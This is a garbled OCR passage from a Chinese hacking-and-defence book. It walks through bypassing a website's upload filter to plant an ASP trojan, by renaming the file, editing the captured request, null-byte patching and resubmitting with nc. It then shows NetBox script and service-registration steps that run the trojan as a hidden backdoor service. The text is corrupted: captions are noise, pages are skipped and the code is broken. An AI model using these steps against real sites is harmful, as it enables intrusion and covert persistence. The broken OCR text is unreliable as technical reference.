FO9
koe
TIPAR
200-0-
BoRE
图4.17被攻击网站的后台界面
180
---
## Page 198
第4章拒绝恶意代码与神秘的黑客
由于上传漏洞的危害严重，所以各种网站都纷纷采取了保护措施，如动网、天意商务网、
飞龙文章系统、惊云下载等。但是，由于网页编程人员的安全防范意识不够，因此很多网站都
只是在代码中加了几个简单的“hidden”变量进行保护。使用类似的“挖掘”方法，还可以进
入许多站点。
出于网络安全考虑，这里以另一个存在挂马的网站为例。使用相同的方法，轻松进入了另
一个网站的“后台操作”界面。令人意想不到的是，在测试的过程中，发现该网站也被人挂马
了。当页面执行完后，在浏览器下方或源代码中可以看到类似的代码，而且网站中的许多页面都存在这个问题。“学习雷锋好榜样”，
如今正是学雷锋的季节，看来我们也要在网络上做点好事了！
不过，被攻击网站的页面有很多，如果手工清除，工作量十分庞大。因此，有必要使用批
量清除工具，通过网站后台快速解决问题。
4.2.4上传木马文件的实战演练
在诸多的网络攻击中，黑客们常常会通过用户验证漏洞、Cookie构造等手段，达到意想不
到的效果。要实现这种效果，一个比较常用的软件就是WSockExpert。这个软件可以监视和截
获网络数据的传输，从而完成网页脚本的分析。为了进一步了解上传过程，本次测试的思路是：
先用WSockExpernt截获网站与本机的交换数据，然后修改截获到的网络交换数据，将伪造的数
据包再次提交发送给网站进行脚本入侵，从而完成攻击的过程。
基于这种思路，首先需要上传一个ASP本马文件，不过，我们注意到，这个网站限制上
传后缓名为“asp”的文件。为了突破该限制，这里选择了更改文件名的方法。将木马文件后
缓更改成“ipg”格式文件后，单击“上传图片”按钮完成上传操作，如图4.18所示。
CMaetenetEp
RMETI
P
74-
图4.18上传ASP木马文件
189
---
## Page 199
网络安全进阶笔记
现在，打开WSockExpert开始监视与此网页进行的数据交换，并将相关描述复制到记事本
中。在相关描述中，我们注意到其中的路径“pic/”，并在其后加上“edasp”，由于增加了
一些字符，因此在长度描述“Content-Length：1509”也需要增加7，即“1502+7-1509”，如
图4.19所示。
工元（式r专）文1
T
EEE
OSE
Faki/qls
T5.1:C3A
图4.19利用WSockExpert监视数据
接下来，用C32ASM把空格对应的十六进制代码“20”修改为“00”，然后再次保存文
现在，打开命令窗口利用NC上传文件。在命令窗口中，输入“ncwww.to***.com 80”等内容，如图4.22所示。
不过，实际应用中，可能有许多页面需要同时清除。如果其他页面也存在挂马现象，利用
“批量清马功能”即可完成。单击界面左侧的“批量清马”链接，在右侧的界面中输入文件路
径、需要排除的文件、文件类型、要清除的特征代码，然后单击“开始执行”按钮，即可快速
完成清除，如图4.23所示。
..1981..
---
## Page 201
网络安全进阶笔记
工A
图4.22查找挂马内容
图4.23清除挂马内容
192
---
## Page 202
第4章拒绝恶意代码与神秘的黑客
站都是非常有效的，而且原理大同小异，只是在实现方法上略有差别而已。在实际应用中，很
多游戏网站都有被“挂马”的经历，网站被挂马不仅会让自己的网站失去信誉，丢失大量客户，
也会让我们这些普通用户陷入黑客设下的陷阱，论为黑客的肉鸡。有些木马还会隐藏自己的真
实地址，如上面所说的，这些代码实际上是
些被转换的字符，在使用过程中，可以使用“牛族字符转换器”等软件，来查看恶意攻击站点
的名字。
通过上面的案例分析，对我们有不少的启发，首先，在实际应用中，要尽量避免使用一些
比较常规的关键词，越是经典的文件名或特征代码就越要小心，因为这样很可能会成为“挖癌
机”等软件的攻击对象：其次，要掌握“挂马”的基本思路，通过一个逆向思路的“清马”，
顺藤摸瓜，在今后的工作中可以找到需要重点防范的地方：另外，还要善于运用各种实用的工
其，如批量解决工其的“批量清马功能”、“牛族字符转换器”的字符转玛功能等。这样，即
使遇到被“挂马”时，也能沉着应对并快速解决问题了。
4.2.6木马觅踪：揭开“网络盒子”中的秘密
在微软公司提出.NET战略之后，国内外形成了一股Web开发的热潮。但是，.NET的运
用还存在很大的难题，微软的现有体系也并非尽善尽美。在现行Web开发体系中，以ASP为
主的应用都是以激码的形式存放在服务器上的，给开发商的知识产权保护和用户的应用安全均
带来很大的隐患。同时，由于ASP一大堆脚本文件放在用户的服务器上，用户稍不留意将其
删除掉一些，系统就无法工作了。针对这种情况，“网络盒子”即NetBox应运面生。
“网络盒子”NetBox（htp:/www.netbox.cn）软件由北京综艺达软件技术有限公司推出，这
是一个全新概念的开发平台，它提供了业界最快速的用于开发Intemet商业应用的开发和编译
工具，它支持包括JavaScript、VBScript、Perl等目前应用最为广泛的脚本语言来构建功能强大
和性能稳定的应用服务器、网络服务器，以及目前最为流行的XML和WebService工业标准
和ASP、COM、.NET等流行标准。总之，使用“网络盒子”大大提高了应用系统的可扩展性、
稳定性和安全性，它可以方便地将ASP等脚本编译成为独立运行的执行程序，即使将IS卸载
后程序照样可以正常运行，完全不需要考虑平台兼容性和对ASP运行环境的要求。
不过，凡事都有两面性，先进的技术往往是一把“双刃剑”。目前，“网络盒子”被很多
黑客所利用，通过“网络盒子”隐藏木马已经成为一个很常见的现象。在安全攻防中，许多黑
客用NetBox建立一个与IIS完全无关的Web服务器，利用它所提供的FSO支持来上传文件。
另外，由于NetBox还支持脚本宿主WSH，这样黑客就可以很轻松地执行命令了，试想，如果
在网站根目录里放上ASP木马或其他的木马，问题岂非更加严重？“知己知彼，百战不殆”，
为了进一步了解这个攻击过程，让广大用户明确这种攻击方式的来龙去脉，下面对这种攻击过
程进行详细讲解。具体的方法如下。
（1）创建一个NetBox应用。创建一个空的目录，假设是C:web：同时，在目录中创建一
个文件，命名为main.box，其内容为：
Dim httpd
设置在服务中运行的名称，可适当修改进行隐藏---
Shell.Service.RunService *NBWeb*.*NetBox Web Server'.*NetBox Http Server
193
---
## Page 203
网络安全进阶笔记
设置服务器启动………
Sub OnServiceStart()
Set httpd=CreateObject(*NetBox.HttpServer*)
-------以下设置测览端口，可修改为其他参数，或更改wwwroot目录--
Ifhttpd.Create（,8080）=0Then
Set host-httpd.AddHost(,*\wwroot*)
host.EnableScript=true
host.AddDefault "default.asp"
host.AddDefault "default.htm
httpd.start
Else
Shell.Quit0
End If
qns pug
Sub OnServiceStop（)
httpd.close
qns pug
Sub OnServicePause()
End Sub
httpd.stop
Sub OnServiceResume()
qxeis'pdau
End Sub
（2）设置木马运行环境。在C：web目录中再创建一个子目录wwwroot，并将所需要的ASP
本马文件全部复制到wwwro中，这里选用的是海阳项端ASP木马。此时，ASP运行环境应
该已经准备好了。为了运行刚才新建的NetBox应用，必须确认8080端口没有被其他程序占用。
双击main.box文件，就可以在窗口右下角看见NetBox的图标。此时，NetBox已经正常运行了。
可以访问htp:/localhost:8080/测试ASP木马是否能正常运行。这样ASP木马就能随心所欲地
运行了，而且不用担心会有日志记录，但是现在它还远不是一个后门，只是提供了与IS相当
的功能。
（3）编译。执行“NetBoxDeploymentWizard”，单击“选择文件夹”，找到刚才建立的
目录C:web，再设置文件类型和输出文件名，单击“Build..（编译）”按钮，开始编译，如图4.24
所示。这样就得到了编译成功的那个执行文件。因为这个例程是以服务方式创建的Web服务
器，所以可以在命令行下执行“myapp-install”将应用安装成为服务，这样，系统无须登录便
可以自动运行应用了。如果需要卸载服务，则可以在命令行下执行如下命令“myapp-remove”
（myapp代表输出的应用文件名，如本例中的test）)。
（4）另一种隐藏木马的方法。直接运行该文件很容易被管理员发现，可以通过srvany.exe
和instsrv.exe文件来隐藏。在命令行下先用instsrv.exe 把srvany.exe注册为服务。格式为
“INSTSRV服务名SRVANY 的路径”，如“INSTSRV SYSTEM C:Iweblsrvany.exe”。其中
SYSTEM是为了便于隐藏服务名。
(5）注册成功后，打开注册表的如下键值：[HKEY_LOCAL_MACHINEISYSTEMICurrent-
ControlSetServicesSYSTEM].SYSTEM是刚才我们注册的服务名，在SYSTEM下面先建立一
个项PARAMETERS，然后在这个项上建立一个键值APPLICATION，填上我们要执行的文件
194